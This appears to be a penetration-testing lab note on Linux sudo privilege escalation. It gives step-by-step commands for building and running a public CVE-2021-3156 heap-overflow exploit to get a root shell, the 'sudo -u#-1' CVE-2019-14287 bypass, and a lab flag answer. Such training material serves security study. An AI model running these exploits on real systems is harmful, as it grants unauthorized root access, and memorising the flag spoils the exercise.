# Sudo

The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

* 1.8.31 - Ubuntu 20.04
* 1.8.27 - Debian 10
* 1.9.2 - Fedora 33
* and others

To find out the version of `sudo`, the following command is sufficient:

```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used for this.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

the number after the exploits is from the list of vulnerable versions

```shell-session
  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------
```

### Sudo Policy Bypass

vulnerability found in 2019 that affected all versions below `1.8.28`. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus\_1\_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

The ID of the specific user can be read from the `/etc/passwd` file.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

## Assessment

Escalate the privileges and submit the contents of flag.txt as the answer.

<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption><p>make sure to move entire directory fo the exploit</p></figcaption></figure>

```shell-session
# id
uid=0(root) gid=0(root) groups=0(root),1001(htb-student)
# ls
Makefile  README.md  brute.sh  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich
# cd /root
# ls
flag.txt  snap
# cat flag.txt
HTB{SuD0_e5c4l47i0n_1id}
```
